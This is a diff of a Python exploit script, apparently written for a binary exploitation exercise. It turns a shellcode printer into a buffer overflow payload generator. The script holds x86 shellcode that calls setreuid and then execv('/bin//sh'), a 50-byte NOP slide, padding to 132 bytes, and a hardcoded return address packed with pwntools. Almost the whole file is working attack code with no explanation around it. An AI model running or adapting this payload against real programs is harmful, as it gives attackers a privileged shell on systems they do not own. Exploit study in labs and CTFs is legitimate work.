@@ -1,14 +1,10 @@
+#!/usr/bin/python3
+from pwn import *
 import sys
 
-NOP_SLIDE = 50
 
-print = lambda *args, **kwargs: None # override print function
+address_of_jump_exit = 0x08049052
 
-
-# setreuid(geteuid(), geteuid())
-# execv("/bin//sh", argv)
-
-# Shellcode in Python
 shellcode = (
     b"\x6a\x31"  # push 0x31 (49)
     b"\x58"      # pop eax
@@ -40,28 +36,16 @@ shellcode = (
     b"\xcd\x80"  # int 0x80 (exit())
 )
 
-# Print shellcode details
-print("Shellcode code is:")
-print("setreuid(geteuid(), geteuid())")
-print("execv(\"/bin//sh\", argv)")
-
-# Print shellcode with NOP slide
-print("\nShellcode as formatted string:")
-
 # Add NOP slide (\x90) before shellcode
-nop_slide = b"\x90" * NOP_SLIDE
-formatted_shellcode = nop_slide + shellcode
+nop_slide = b"\x90" * 50
 
-# Convert to formatted string
-formatted_string = "".join(f"\\x{byte:02x}" for byte in formatted_shellcode)
-print(formatted_string)
+shellcode = nop_slide + shellcode
 
-# Print shellcode in hex format
-print("\nShellcode in hex format:")
-print("".join(f"{byte:02x}" for byte in formatted_shellcode))
+# Create payload
 
-# Calculate shellcode length
-print(f"\nLength of shellcode is {len(formatted_shellcode)} bytes")
+payload = shellcode
+payload += b'A' * (132 - len(payload))
 
-sys.stdout.buffer.write(formatted_shellcode)
-# export SHELLCODE=$(python3 shellcode.py)
+payload += p32(address_of_jump_exit)
+
+sys.stdout.buffer.write(payload)
